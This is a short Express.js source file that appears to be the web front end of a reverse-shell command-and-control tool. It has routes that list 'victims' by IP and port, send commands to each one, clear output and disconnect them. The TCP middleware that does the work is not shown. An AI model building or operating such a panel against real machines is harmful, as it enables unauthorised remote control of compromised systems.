var express = require('express');
var bodyParser = require('body-parser');
var nunjucks = require('nunjucks');
var TCPserver = require('./middleware/TCPMiddleware');

var app = express();
app.use(bodyParser.urlencoded({extended:true}));
nunjucks.configure('views', {
    autoescape: true,
    express: app
});

app.get('/', TCPserver.getVictims, function (req, res) {
    if (req.victims.length == 0){
        res.render('index.html');
    }
    else{
        res.render('hub.html', { victims: req.victims });
    }
})

app.get('/:ip/:port', TCPserver.getCommandLine, function (req, res) {
    res.render('victim.html', { victim: req.victim });
})

app.post('/:ip/:port', TCPserver.send, function (req, res) {
    res.render('victim.html', { victim: req.victim });
})

app.post('/:ip/:port/disconnect', TCPserver.disconnect, function(req, res){ 
    res.redirect(303, '/');
})

app.post('/:ip/:port/clear', TCPserver.clearCommandLine, function(req, res){ 
    res.redirect(303, '/' + req.params.ip + '/' + req.params.port);
})

app.listen(8080);